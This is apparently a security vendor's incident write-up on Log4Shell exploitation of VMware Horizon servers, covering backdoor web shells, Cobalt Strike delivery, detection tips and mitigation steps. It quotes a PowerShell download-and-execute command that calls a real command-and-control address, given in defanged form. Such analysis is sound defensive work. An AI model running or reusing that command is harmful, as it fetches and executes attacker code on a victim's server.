These web shells allow unauthenticated attackers to\nremotely execute commands on your server as NT AUTHORITY\\SYSTEM (root privileges).\nAccording to Shodan, ~25,000 Horizon servers are currently internet accessible worldwide.\n\nOur team is continuing to track this activity and this post will be updated with new information\nas it becomes available.\n\n\n-----\n\n[Image Source: NHS - https://digital.nhs.uk/cyber-alerts/2022/cc-4002](https://digital.nhs.uk/cyber-alerts/2022/cc-4002)\n\nBased on Huntress’ dataset of 180 Horizon servers, we’ve validated NHS’ intel and\ndiscovered 10% of these systems (18) had been backdoored with a modified absg-worker.js\nweb shell. It’s important to note that ~34% of the 180 Horizon servers (62) we analyzed were\nunpatched and internet-facing at the time of this publication. the web shells on these 18\ncompromised systems established a timeline that started on December 25, 2021 and\ncontinued until December 29, 2021.\n\n**New Behavior**\n\nOn January 14 at 1458 ET, an unrelated Managed Antivirus detection (Microsoft Defender)\ntipped our ThreatOps team to new exploitation of the Log4Shell vulnerability in VMware\nHorizon. This time it was used to deliver the Cobalt Strike implant.\n\n\n-----\n\n[Additional security researchers including TheDFIRReport and](https://twitter.com/TheDFIRReport/status/1482078434327244805?s=20) [Red Canary reported similar](https://twitter.com/redcanary/status/1482100290698375169?s=20)\nbehavior around the same time—confirming a PowerShell based downloader executed a\nCobalt Strike payload that was configured to call back to 185.112.83[.]116 for command and\ncontrol.\n\niex ((New-Object\nhttp://System.Net.WebClient).DownloadString('http://185.112.83[.]116:8080/drv'))\n\nAt 1938 ET, we started deploying Huntress’ soon-to-be-released Process Insights agent to all\nof the VMware Horizon servers we protect. This new EDR capability is based on an\n[acquisition we made in early 2021 and allows us to proactively detect and respond to non-](https://searchitchannel.techtarget.com/news/252495064/Huntress-security-platform-gets-boost-from-Level-Effect-EDR)\npersistent malicious behavior by giving us the ability to collect detailed information about\nprocesses.\n\n**Initial Access Source**\n\nDespite mass exploitation of VMware Horizon to deliver web shells, our data suggests\ntoday's Cobalt Strike deployments were exploitation of Horizon itself and not the abuse of\nweb shells. This conclusion is largely based on analysis of the PowerShell payload's parent\nprocess where web shell abuse spawns from node.exe while exploitation of Log4Shell in\nHorizon spawns from ws_tomcatservice.exe as pictured.\n\n\n-----\n\n[(Rendered in Elastic Kibana with Huntress' Process Insights)](https://www.elastic.co/kibana/)\n\n**Detection Tips**\n\nFor those of you just learning about the mass exploitation of VMware Horizon servers and\nthe installation of backdoor web shells, you should seriously consider the possibility that your\nserver is compromised if it was unpatched and internet-facing. To help you determine your\nstatus,\n\nwe strongly suggest you perform the following actions:\n\n\n-----\n\nRun VMware s [Horizon Mitigation tool to report whether there is a vulnerable Log4J](https://kb.vmware.com/sfc/servlet.shepherd/version/download/0685G00000e9d3cQAA)\nlibrary or child_process based web shell present under the installation location with the\nfollowing command: Horizon_Windows_Log4j_Mitigation.bat /verbose\nManually inspect/assess the files within %ProgramFiles%\\VMware\\VMware\nView\\Server\\appblastgateway\\ for the presence of the child_process string as pictured\nhere.\nReview historical records for evidence of node.exe or ws_TomcatService.exe spawning\nabnormal processes to include PowerShell.\n\n**Mitigation Steps**\n\nThis new wave of coordinated hacking emphasizes the criticality of patching these servers\nimmediately. VMware has [produced detailed guidance to help you address these security](https://kb.vmware.com/s/article/87073)\nvulnerabilities.\n\nShould you discover a web shell, VMware recommends you “take down the system and\n[engage [an] Incident Response Team” to fully assess the compromise. Alternatively,](https://www.gosolis.com/)\nHuntress recommends you restore from a backup prior to December 25 to remove the web\n[shell. With that said, it’s entirely possible attackers exploited CVE-2021-44228 and](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) CVE2021-45046 to spread laterally within your network so you should proceed with caution.\n\n\n-----",
